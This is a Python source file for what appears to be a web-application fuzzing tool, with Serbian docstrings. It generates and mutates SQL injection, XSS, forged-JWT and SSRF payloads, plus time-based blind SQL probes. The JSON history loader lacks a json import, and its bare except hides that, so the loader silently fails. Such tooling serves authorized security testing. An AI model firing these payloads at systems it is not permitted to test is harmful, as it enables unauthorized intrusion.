import random

class MutationEngine:
    def __init__(self):
        self.attack_types = ["SQLi", "XSS", "JWT", "SSRF"]

    def generate_payload(self, attack_vector):
        """Generiše payload na osnovu vektora napada"""
        if attack_vector == "SQLi":
            return f"' OR {random.randint(1, 10)}={random.randint(1, 10)} --"
        elif attack_vector == "XSS":
            return f'<script>alert("{random.choice(["X", "Y", "Z"])}")</script>'
        elif attack_vector == "JWT":
            return {
                "role": "admin",
                "exp": random.randint(1000000000, 2000000000)
            }
        elif attack_vector == "SSRF":
            return f"http://127.0.0.1:{random.randint(8000, 9000)}/internal"
        return "UNDEFINED_PAYLOAD"

    def mutate_payload(self, payload):
        """Vrši mutacije nad postojećim payload-om"""
        if isinstance(payload, str):
            return [
                payload[::-1],
                payload + "--",
                payload.replace("'", "\""),
                ''.join(random.choice([c.upper(), c.lower()]) for c in payload)
            ]
        elif isinstance(payload, dict):
            mutated = payload.copy()
            if "role" in mutated:
                mutated["role"] = "superadmin"
            return [mutated]
        return [payload]

    def adapt_to_environment(self, db_type):
        """Generiše specifičan napad na osnovu baze"""
        if db_type == "MySQL":
            return "SELECT sleep(5)"
        elif db_type == "PostgreSQL":
            return "SELECT pg_sleep(5)"
        elif db_type == "MongoDB":
            return '{"$where": "sleep(5000)"}'
        return "SELECT delay(5)"
    def load_successful_history(self, attack_type, history_file="data/fuzz_history.json"):
        try:
            with open(history_file, "r") as f:
                history = json.load(f)
            return [h["payload"] for h in history.get(attack_type, []) if h["success"]]
        except:
            return []
